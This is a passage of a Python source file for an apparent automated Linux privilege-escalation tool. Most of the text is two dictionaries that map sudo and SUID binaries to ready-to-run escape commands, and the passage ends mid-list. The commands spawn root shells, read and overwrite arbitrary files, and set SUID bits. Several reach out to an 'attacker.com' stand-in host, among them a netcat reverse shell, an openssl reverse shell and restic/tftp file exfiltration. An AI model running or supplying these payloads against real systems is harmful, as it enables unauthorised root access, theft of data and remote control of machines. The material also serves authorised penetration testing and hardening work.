#! /usr/bin/env/python
# -*- coding: utf-8 -*-
# https://github.com/Frissi0n/GTFONow
# Automatic privilege escalation for misconfigured capabilities, sudo and suid binaries.

from __future__ import print_function
import subprocess
import getpass
import os
import functools
import argparse
import sys

try:
    input = raw_input
except NameError:
    pass

red = '\033[31m'
green = '\033[32m'
lightgrey = '\033[37m'
reset = '\033[0m'


def print_info(message):
    print(lightgrey + "[*] " + reset + message)


def print_error(message):
    print(red + "[x] " + reset + message)


def print_finding(message):
    print(green + "[!] " + reset + message)


sudo_bins = {
    "head":
    [
        "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
    ],
    "journalctl":
    [
        "sudo journalctl\n!/bin/sh\n"
    ],
    "systemctl":
    [
        "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
        "sudo systemctl\n!sh\n"
    ],
    "arp":
    [
        "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
    ],
    "slsh":
    [
        "sudo slsh -e 'system(\"/bin/sh\")'"
    ],
    "ash":
    [
        "sudo ash"
    ],
    "cupsfilter":
    [
        "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    ],
    "apt":
    [
        "sudo apt-get changelog apt\n!/bin/sh\n",
        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
        "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
    ],
    "cpulimit":
    [
        "sudo cpulimit -l 100 -f /bin/sh"
    ],
    "ip":
    [
        "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
        "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n"
    ],
    "flock":
    [
        "sudo flock -u / /bin/sh"
    ],
    "gcc":
    [
        "sudo gcc -wrapper /bin/sh,-s ."
    ],
    "exiftool":
    [
        "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
    ],
    "puppet":
    [
        "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
    ],
    "psql":
    [
        "psql\n\\?\n!/bin/sh\n"
    ],
    "find":
    [
        "sudo find . -exec /bin/sh \\; -quit"
    ],
    "gdb":
    [
        "sudo gdb -nx -ex '!sh' -ex quit"
    ],
    "make":
    [
        "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    ],
    "diff":
    [
        "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
    ],
    "ksshell":
    [
        "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
    ],
    "ss":
    [
        "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
    ],
    "tftp":
    [
        "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
    ],
    "nice":
    [
        "sudo nice /bin/sh"
    ],
    "vim":
    [
        "sudo vim -c ':!/bin/sh'",
        "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "pic":
    [
        "sudo pic -U\n.PS\nsh X sh X\n"
    ],
    "python":
    [
        "sudo python -c 'import os; os.system(\"/bin/sh\")'"
    ],
    "update-alternatives":
    [
        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    ],
    "dnf":
    [
        "sudo dnf install -y x-1.0-1.noarch.rpm\n"
    ],
    "nmap":
    [
        "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
        "sudo nmap --interactive\nnmap> !sh\n"
    ],
    "more":
    [
        "TERM= sudo more /etc/profile\n!/bin/sh\n"
    ],
    "ionice":
    [
        "sudo ionice /bin/sh"
    ],
    "emacs":
    [
        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
    ],
    "socat":
    [
        "sudo socat stdin exec:/bin/sh\n"
    ],
    "zip":
    [
        "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
    ],
    "yum":
    [
        "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
        "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
    ],
    "check_cups":
    [
        "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
    ],
    "rake":
    [
        "sudo rake -p '`/bin/sh 1>&0`'"
    ],
    "jq":
    [
        "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
    ],
    "check_statusfile":
    [
        "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
    ],
    "nano":
    [
        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
    ],
    "uniq":
    [
        "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
    ],
    "cobc":
    [
        "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
    ],
    "ghci":
    [
        "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
    ],
    "split":
    [
        "split --filter=/bin/sh /dev/stdin\n"
    ],
    "busybox":
    [
        "sudo busybox sh"
    ],
    "pico":
    [
        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
    ],
    "pry":
    [
        "sudo pry\nsystem(\"/bin/sh\")\n"
    ],
    "lwp-request":
    [
        "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
    ],
    "ldconfig":
    [
        "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
    ],
    "pr":
    [
        "LFILE=file_to_read\npr -T $LFILE\n"
    ],
    "rpmquery":
    [
        "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
    ],
    "view":
    [
        "sudo view -c ':!/bin/sh'",
        "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "tbl":
    [
        "LFILE=file_to_read\nsudo tbl $LFILE\n"
    ],
    "nl":
    [
        "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
    ],
    "rview":
    [
        "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "tcpdump":
    [
        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
    ],
    "file":
    [
        "LFILE=file_to_read\nsudo file -f $LFILE\n"
    ],
    "dig":
    [
        "LFILE=file_to_read\nsudo dig -f $LFILE\n"
    ],
    "gawk":
    [
        "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "xargs":
    [
        "sudo xargs -a /dev/null sh"
    ],
    "expand":
    [
        "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
    ],
    "nsenter":
    [
        "sudo nsenter /bin/sh"
    ],
    "strings":
    [
        "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
    ],
    "restic":
    [
        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    ],
    "xxd":
    [
        "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
    ],
    "cowthink":
    [
        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
    ],
    "eqn":
    [
        "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
    ],
    "byebug":
    [
        "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
    ],
    "ksh":
    [
        "sudo ksh"
    ],
    "scp":
    [
        "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
    ],
    "ld.so":
    [
        "sudo /lib/ld.so /bin/sh"
    ],
    "check_raid":
    [
        "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
    ],
    "ftp":
    [
        "sudo ftp\n!/bin/sh\n"
    ],
    "date":
    [
        "LFILE=file_to_read\nsudo date -f $LFILE\n"
    ],
    "tac":
    [
        "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
    ],
    "wget":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE\n"
    ],
    "run-mailcap":
    [
        "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
    ],
    "start-stop-daemon":
    [
        "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
    ],
    "mysql":
    [
        "sudo mysql -e '\\! /bin/sh'"
    ],
    "check_ssl_cert":
    [
        "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
    ],
    "column":
    [
        "LFILE=file_to_read\nsudo column $LFILE\n"
    ],
    "pkexec":
    [
        "sudo pkexec /bin/sh"
    ],
    "nc":
    [
        "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
    ],
    "gtester":
    [
        "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
    ],
    "fold":
    [
        "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
    ],
    "less":
    [
        "sudo less /etc/profile\n!/bin/sh\n"
    ],
    "jrunscript":
    [
        "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "run-parts":
    [
        "sudo run-parts --new-session --regex '^sh$' /bin"
    ],
    "rvim":
    [
        "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "uudecode":
    [
        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "ssh":
    [
        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
    ],
    "sftp":
    [
        "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
    ],
    "sysctl":
    [
        "LFILE=file_to_read\nsudo sysctl -n \"/../../$LFILE\"\n"
    ],
    "pip":
    [
        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
    ],
    "node":
    [
        "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
    ],
    "php":
    [
        "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
    ],
    "watch":
    [
        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "rpm":
    [
        "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
        "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
    ],
    "install":
    [
        "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
    ],
    "rlwrap":
    [
        "sudo rlwrap /bin/sh"
    ],
    "basenc":
    [
        "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
    ],
    "mount":
    [
        "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
    ],
    "highlight":
    [
        "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
    ],
    "dmsetup":
    [
        "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
    ],
    "xz":
    [
        "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
    ],
    "ex":
    [
        "sudo ex\n!/bin/sh\n"
    ],
    "stdbuf":
    [
        "sudo stdbuf -i0 /bin/sh"
    ],
    "hexdump":
    [
        "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
    ],
    "ed":
    [
        "sudo ed\n!/bin/sh\n"
    ],
    "paste":
    [
        "LFILE=file_to_read\nsudo paste $LFILE\n"
    ],
    "script":
    [
        "sudo script -q /dev/null"
    ],
    "check_log":
    [
        "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
    ],
    "base32":
    [
        "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
    ],
    "gem":
    [
        "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
    ],
    "jjs":
    [
        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
    ],
    "setarch":
    [
        "sudo setarch $(arch) /bin/sh"
    ],
    "dd":
    [
        "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
    ],
    "sqlite3":
    [
        "sudo sqlite3 /dev/null '.shell /bin/sh'"
    ],
    "ltrace":
    [
        "sudo ltrace -b -L /bin/sh"
    ],
    "bpftrace":
    [
        "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
        "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
        "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
    ],
    "dmesg":
    [
        "sudo dmesg -H\n!/bin/sh\n"
    ],
    "crash":
    [
        "sudo crash -h\n!sh\n"
    ],
    "easy_install":
    [
        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
    ],
    "env":
    [
        "sudo env /bin/sh"
    ],
    "base64":
    [
        "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"
    ],
    "zypper":
    [
        "sudo zypper x\n",
        "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
    ],
    "curl":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
    ],
    "hd":
    [
        "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
    ],
    "nroff":
    [
        "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
    ],
    "pg":
    [
        "sudo pg /etc/profile\n!/bin/sh\n"
    ],
    "zsoelim":
    [
        "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
    ],
    "cowsay":
    [
        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
    ],
    "dialog":
    [
        "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
    ],
    "uuencode":
    [
        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "comm":
    [
        "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
    ],
    "chmod":
    [
        "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
    ],
    "mawk":
    [
        "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "rev":
    [
        "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
    ],
    "wish":
    [
        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    ],
    "nohup":
    [
        "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    ],
    "telnet":
    [
        "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
    ],
    "od":
    [
        "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
    ],
    "time":
    [
        "sudo /usr/bin/time /bin/sh"
    ],
    "bundler":
    [
        "sudo bundler help\n!/bin/sh\n"
    ],
    "rsync":
    [
        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "mail":
    [
        "sudo mail --exec='!/bin/sh'"
    ],
    "logsave":
    [
        "sudo logsave /dev/null /bin/sh -i"
    ],
    "screen":
    [
        "sudo screen"
    ],
    "lua":
    [
        "sudo lua -e 'os.execute(\"/bin/sh\")'"
    ],
    "busctl":
    [
        "sudo busctl --show-machine\n!/bin/sh\n"
    ],
    "csplit":
    [
        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    ],
    "tee":
    [
        "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
    ],
    "iftop":
    [
        "sudo iftop\n!/bin/sh\n"
    ],
    "eb":
    [
        "sudo eb logs\n!/bin/sh\n"
    ],
    "troff":
    [
        "LFILE=file_to_read\nsudo troff $LFILE\n"
    ],
    "git":
    [
        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
        "sudo git -p help config\n!/bin/sh\n",
        "sudo git branch --help config\n!/bin/sh\n",
        "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
        "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
    ],
    "fmt":
    [
        "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
    ],
    "tail":
    [
        "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
    ],
    "expect":
    [
        "sudo expect -c 'spawn /bin/sh;interact'"
    ],
    "openssl":
    [
        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    ],
    "unexpand":
    [
        "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
    ],
    "smbclient":
    [
        "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
    ],
    "service":
    [
        "sudo service ../../bin/sh"
    ],
    "check_by_ssh":
    [
        "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
    ],
    "dpkg":
    [
        "sudo dpkg -l\n!/bin/sh\n",
        "sudo dpkg -i x_1.0_all.deb"
    ],
    "iconv":
    [
        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    ],
    "grep":
    [
        "LFILE=file_to_read\nsudo grep '' $LFILE\n"
    ],
    "hping3":
    [
        "sudo hping3\n/bin/sh\n"
    ],
    "irb":
    [
        "sudo irb\nexec '/bin/bash'\n"
    ],
    "apt-get":
    [
        "sudo apt-get changelog apt\n!/bin/sh\n",
        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
        "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
    ],
    "cpan":
    [
        "sudo cpan\n! exec '/bin/bash'\n"
    ],
    "strace":
    [
        "sudo strace -o /dev/null /bin/sh"
    ],
    "redcarpet":
    [
        "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
    ],
    "ruby":
    [
        "sudo ruby -e 'exec \"/bin/sh\"'"
    ],
    "csh":
    [
        "sudo csh"
    ],
    "ul":
    [
        "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
    ],
    "genisoimage":
    [
        "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
    ],
    "facter":
    [
        "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
    ],
    "timeout":
    [
        "sudo timeout --foreground 7d /bin/sh"
    ],
    "taskset":
    [
        "sudo taskset 1 /bin/sh"
    ],
    "ssh-keyscan":
    [
        "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
    ],
    "nawk":
    [
        "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "pdb":
    [
        "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
    ],
    "red":
    [
        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
    ],
    "ghc":
    [
        "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
    ],
    "capsh":
    [
        "sudo capsh --"
    ],
    "docker":
    [
        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "tclsh":
    [
        "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    ],
    "dash":
    [
        "sudo dash"
    ],
    "zsh":
    [
        "sudo zsh"
    ],
    "join":
    [
        "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
    ],
    "at":
    [
        "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
    ],
    "su":
    [
        "sudo su"
    ],
    "top":
    [
        "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
    ],
    "awk":
    [
        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "cp":
    [
        "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n"
    ],
    "gimp":
    [
        "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    ],
    "chroot":
    [
        "sudo chroot /\n"
    ],
    "xmodmap":
    [
        "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
    ],
    "perl":
    [
        "sudo perl -e 'exec \"/bin/sh\";'"
    ],
    "mtr":
    [
        "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
    ],
    "sort":
    [
        "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
    ],
    "man":
    [
        "sudo man man\n!/bin/sh\n"
    ],
    "cat":
    [
        "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
    ],
    "tar":
    [
        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ],
    "aria2c":
    [
        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
    ],
    "shuf":
    [
        "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
    ],
    "sed":
    [
        "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
    ],
    "composer":
    [
        "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
    ],
    "check_memory":
    [
        "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
    ],
    "soelim":
    [
        "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
    ],
    "look":
    [
        "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
    ],
    "tmux":
    [
        "sudo tmux"
    ],
    "bash":
    [
        "sudo bash"
    ],
    "chown":
    [
        "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
    ],
    "unshare":
    [
        "sudo unshare /bin/sh"
    ],
    "readelf":
    [
        "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
    ],
    "cut":
    [
        "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
    ],
    "mv":
    [
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
    ],
    "vi":
    [
        "sudo vi -c ':!/bin/sh' /dev/null"
    ],
    "valgrind":
    [
        "sudo valgrind /bin/sh"
    ],
    "lwp-download":
    [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
    ],
    "crontab":
    [
        "sudo crontab -e"
    ]
}

suid_bins = {
    "head":
    [
        "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
    ],
    "systemctl":
    [
        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
    ],
    "arp":
    [
        "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
    ],
    "ash":
    [
        "./ash"
    ],
    "cupsfilter":
    [
        "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    ],
    "ip":
    [
        "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
        "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
    ],
    "flock":
    [
        "./flock -u / /bin/sh -p"
    ],
    "find":
    [
        "./find . -exec /bin/sh -p \\; -quit"
    ],
    "gdb":
    [
        "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
    ],
    "make":
    [
        "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    ],
    "diff":
    [
        "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
    ],
    "ksshell":
    [
        "LFILE=file_to_read\n./ksshell -i $LFILE\n"
    ],
    "ss":
    [
        "LFILE=file_to_read\n./ss -a -F $LFILE\n"
    ],
    "tftp":
    [
        "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
    ],
    "nice":
    [
        "./nice /bin/sh -p"
    ],
    "vim":
    [
        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "python":
    [
        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "update-alternatives":
    [
        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    ],
    "nmap":
    [
        "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
    ],
    "more":
    [
        "./more file_to_read"
    ],
    "ionice":
    [
        "./ionice /bin/sh -p"
    ],
    "emacs":
    [
        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
    ],
    "jq":
    [
        "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
    ],
    "uniq":
    [
        "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
    ],
    "busybox":
    [
        "./busybox sh"
    ],
    "lwp-request":
    [
        "LFILE=file_to_read\n./lwp-request \"file://$LFILE\"\n"
    ],
    "pr":
    [
        "LFILE=file_to_read\npr -T $LFILE\n"
    ],
    "view":
    [
        "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "tbl":
    [
        "LFILE=file_to_read\n./tbl $LFILE\n"
    ],
    "nl":
    [
        "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
    ],
    "rview":
    [
        "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "file":
    [
        "LFILE=file_to_read\n./file -f $LFILE\n"
    ],
    "dig":
    [
        "LFILE=file_to_read\n./dig -f $LFILE\n"
    ],
    "xargs":
    [
        "./xargs -a /dev/null sh -p"
    ],
    "expand":
    [
        "LFILE=file_to_read\n./expand \"$LFILE\"\n"
    ],
    "strings":
    [
        "LFILE=file_to_read\n./strings \"$LFILE\"\n"
    ],
    "restic":
    [
        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    ],
    "xxd":
    [
        "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
    ],
    "eqn":
    [
        "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
    ],
    "ksh":
    [
        "./ksh -p"
